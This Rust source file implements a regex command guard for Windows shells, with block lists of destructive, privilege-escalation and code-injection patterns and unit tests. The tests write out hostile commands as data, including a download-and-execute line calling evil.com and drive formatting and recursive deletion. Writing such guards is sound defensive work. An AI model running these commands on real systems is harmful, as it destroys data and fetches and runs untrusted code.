//! Regex-based command guard for platforms without AST parsing support.
//!
//! Detects dangerous patterns in cmd.exe and PowerShell commands.
//! This is defense-in-depth — regex cannot catch obfuscated commands,
//! but it blocks the obvious dangerous patterns.

use regex::RegexSet;

use crate::sandbox::SandboxError;

/// Regex-based command validator for Windows (cmd.exe + PowerShell).
pub struct RegexGuard {
    destructive: RegexSet,
    escalation: RegexSet,
    injection: RegexSet,
    sensitive_paths: RegexSet,
}

impl RegexGuard {
    pub fn new() -> Self {
        Self {
            destructive: RegexSet::new([
                // cmd.exe destructive
                r"(?i)\bdel\b.*/[sfq]",
                r"(?i)\brmdir\b.*/s",
                r"(?i)\brd\b.*/s",
                r"(?i)\bformat\b\s+[a-z]:",
                r"(?i)\bdiskpart\b",
                r"(?i)\bcipher\b.*/w",
                // PowerShell destructive
                r"(?i)\bRemove-Item\b.*-Recurse",
                r"(?i)\bRemove-Item\b.*-Force",
                r"(?i)\bclear-content\b",
                r"(?i)\bFormat-Volume\b",
            ])
            .expect("destructive patterns"),

            escalation: RegexSet::new([
                // cmd.exe escalation
                r"(?i)\brunas\b",
                // PowerShell escalation
                r"(?i)Start-Process\b.*-Verb\s+RunAs",
                r"(?i)\bSet-ExecutionPolicy\b",
                r"(?i)\bDisable-WindowsOptionalFeature\b",
                r"(?i)\bEnable-WindowsOptionalFeature\b",
                // Service manipulation
                r"(?i)\bsc\s+(delete|create|config)\b",
                r"(?i)\bNew-Service\b",
                r"(?i)\bRemove-Service\b",
            ])
            .expect("escalation patterns"),

            injection: RegexSet::new([
                // PowerShell injection / code execution
                r"(?i)\bInvoke-Expression\b",
                r"(?i)\biex\b\s",
                r"(?i)-EncodedCommand\b",
                r"(?i)-[eE][nN]?[cC]?\s",
                r"(?i)\bInvoke-Command\b",
                r"(?i)\bNew-Object\b.*Net\.WebClient",
                r"(?i)\bDownloadString\b",
                r"(?i)\bDownloadFile\b",
                r"(?i)\bInvoke-WebRequest\b.*\|\s*iex",
                // Registry modification
                r"(?i)\breg\s+delete\b",
                r"(?i)\breg\s+add\b",
                r"(?i)\bRemove-ItemProperty\b",
                r"(?i)\bSet-ItemProperty\b.*Registry",
                r"(?i)\bNew-ItemProperty\b.*Registry",
            ])
            .expect("injection patterns"),

            sensitive_paths: RegexSet::new([
                r"(?i)C:\\Windows\\",
                r"(?i)C:\\Program Files",
                r"(?i)C:\\ProgramData\\",
                r"(?i)\\System32\\",
                r"(?i)\\SysWOW64\\",
                r"(?i)HKLM:\\",
                r"(?i)HKCU:\\",
                r"(?i)\\\.ssh\\",
            ])
            .expect("sensitive path patterns"),
        }
    }

    /// Validates a command against all regex pattern categories.
    pub fn validate(&self, command: &str) -> Result<(), SandboxError> {
        if command.trim().is_empty() {
            return Ok(());
        }

        if self.destructive.is_match(command) {
            return Err(SandboxError::Blocked(format!(
                "destructive command detected: {}",
                truncate(command, 80),
            )));
        }

        if self.escalation.is_match(command) {
            return Err(SandboxError::Blocked(format!(
                "privilege escalation detected: {}",
                truncate(command, 80),
            )));
        }

        if self.injection.is_match(command) {
            return Err(SandboxError::Blocked(format!(
                "code injection / registry modification detected: {}",
                truncate(command, 80),
            )));
        }

        // Sensitive paths — only block if command also contains a write-like verb
        if self.sensitive_paths.is_match(command) && looks_like_write(command) {
            return Err(SandboxError::PathViolation(format!(
                "write to sensitive path detected: {}",
                truncate(command, 80),
            )));
        }

        Ok(())
    }
}

impl Default for RegexGuard {
    fn default() -> Self {
        Self::new()
    }
}

/// Returns true if the command looks like it's writing (not just reading).
fn looks_like_write(cmd: &str) -> bool {
    let lower = cmd.to_lowercase();
    lower.contains('>') // redirect
        || lower.contains("set-content")
        || lower.contains("add-content")
        || lower.contains("out-file")
        || lower.contains("copy ")
        || lower.contains("move ")
        || lower.contains("rename ")
        || lower.contains("new-item")
        || lower.contains("del ")
        || lower.contains("echo ") && lower.contains('>')
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}…", &s[..max])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn guard() -> RegexGuard {
        RegexGuard::new()
    }

    // ── Destructive ─────────────────────────────────────────────

    #[test]
    fn blocks_del_recursive() {
        assert!(guard().validate("del /f /s /q C:\\temp\\*").is_err());
    }

    #[test]
    fn blocks_rmdir_recursive() {
        assert!(guard().validate("rmdir /s /q C:\\old").is_err());
    }

    #[test]
    fn blocks_rd_recursive() {
        assert!(guard().validate("rd /s /q mydir").is_err());
    }

    #[test]
    fn blocks_format_drive() {
        assert!(guard().validate("format D: /fs:ntfs").is_err());
    }

    #[test]
    fn blocks_diskpart() {
        assert!(guard().validate("diskpart").is_err());
    }

    #[test]
    fn blocks_remove_item_recurse() {
        assert!(guard()
            .validate("Remove-Item -Path C:\\old -Recurse -Force")
            .is_err());
    }

    #[test]
    fn blocks_format_volume() {
        assert!(guard().validate("Format-Volume -DriveLetter D").is_err());
    }

    // ── Escalation ──────────────────────────────────────────────

    #[test]
    fn blocks_runas() {
        assert!(guard().validate("runas /user:admin cmd").is_err());
    }

    #[test]
    fn blocks_start_process_runas() {
        assert!(guard()
            .validate("Start-Process cmd -Verb RunAs")
            .is_err());
    }

    #[test]
    fn blocks_set_execution_policy() {
        assert!(guard()
            .validate("Set-ExecutionPolicy Unrestricted")
            .is_err());
    }

    #[test]
    fn blocks_sc_delete() {
        assert!(guard().validate("sc delete MyService").is_err());
    }

    // ── Injection ───────────────────────────────────────────────

    #[test]
    fn blocks_invoke_expression() {
        assert!(guard().validate("Invoke-Expression $cmd").is_err());
    }

    #[test]
    fn blocks_iex() {
        assert!(guard().validate("iex $payload").is_err());
    }

    #[test]
    fn blocks_encoded_command() {
        assert!(guard()
            .validate("powershell -EncodedCommand SQBFAFAA")
            .is_err());
    }

    #[test]
    fn blocks_download_and_exec() {
        assert!(guard()
            .validate("(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')")
            .is_err());
    }

    #[test]
    fn blocks_reg_delete() {
        assert!(guard()
            .validate("reg delete HKLM\\Software\\MyApp /f")
            .is_err());
    }

    #[test]
    fn blocks_reg_add() {
        assert!(guard()
            .validate("reg add HKLM\\Software\\MyApp /v Key /d Value")
            .is_err());
    }

    // ── Sensitive paths ─────────────────────────────────────────

    #[test]
    fn blocks_write_to_windows_dir() {
        assert!(guard()
            .validate("copy evil.exe C:\\Windows\\System32\\evil.exe")
            .is_err());
    }

    #[test]
    fn blocks_write_to_program_files() {
        assert!(guard()
            .validate("echo payload > C:\\Program Files\\app\\config.ini")
            .is_err());
    }

    #[test]
    fn allows_read_from_windows_dir() {
        // Reading system dirs is fine
        assert!(guard().validate("dir C:\\Windows\\System32").is_ok());
    }

    #[test]
    fn allows_read_from_program_files() {
        assert!(guard()
            .validate("type C:\\Program Files\\app\\readme.txt")
            .is_ok());
    }

    // ── Safe commands ───────────────────────────────────────────

    #[test]
    fn allows_dir() {
        assert!(guard().validate("dir").is_ok());
    }

    #[test]
    fn allows_echo() {
        assert!(guard().validate("echo hello world").is_ok());
    }

    #[test]
    fn allows_type() {
        assert!(guard().validate("type myfile.txt").is_ok());
    }

    #[test]
    fn allows_get_childitem() {
        assert!(guard().validate("Get-ChildItem -Path .").is_ok());
    }

    #[test]
    fn allows_git() {
        assert!(guard().validate("git status").is_ok());
    }

    #[test]
    fn allows_cargo() {
        assert!(guard().validate("cargo build --release").is_ok());
    }

    #[test]
    fn allows_empty() {
        assert!(guard().validate("").is_ok());
    }

    #[test]
    fn allows_safe_del() {
        // del without /s /f flags — single file deletion is OK
        assert!(guard().validate("del myfile.tmp").is_ok());
    }
}
